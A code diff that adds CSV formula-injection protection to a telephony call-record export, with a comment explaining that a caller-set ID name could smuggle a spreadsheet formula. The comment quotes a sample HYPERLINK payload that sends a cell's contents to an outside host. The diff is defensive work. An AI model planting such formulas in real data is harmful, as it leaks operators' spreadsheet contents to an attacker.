@@ -274,9 +274,29 @@ cdrs.get("/export", requirePermission("cdr", "export"), async (c) => {
     "trunkName",
   ];
 
+  /**
+   * RFC 4180 quoting, plus a formula guard.
+   *
+   * Excel, LibreOffice and Sheets execute a cell that begins with `=`, `+`, `-`, `@` or a
+   * leading tab/CR. `callerName` is `caller_id_name` off the inbound SIP profile
+   * (services/cdr.ts), so it is set by whoever placed the call - an inbound caller can name
+   * themselves `=HYPERLINK("http://them/"&A1,"x")` and read a row out of an operator's
+   * spreadsheet when the export is opened.
+   *
+   * Prefixing with an apostrophe is the portable neutraliser. Done before quoting, so it ends
+   * up inside the quoted field.
+   *
+   * The carve-out matters on a telephony export: `+14165550100` starts with a guarded character
+   * and is a phone number, not a formula, and prefixing every one of them corrupts the column an
+   * operator reconciles billing against. A value that is only digits and punctuation after a
+   * leading + or - cannot reach anything - a function call needs letters - so arithmetic is the
+   * worst it can evaluate to. Anything with a letter in it goes back to being guarded.
+   */
   function csvCell(v: unknown): string {
     if (v == null) return "";
-    const s = v instanceof Date ? v.toISOString() : String(v);
+    let s = v instanceof Date ? v.toISOString() : String(v);
+    const phoneLike = /^[+-][\d\s().-]*$/.test(s);
+    if (!phoneLike && /^[=+\-@\t\r]/.test(s)) s = `'${s}`;
     if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
     return s;
   }
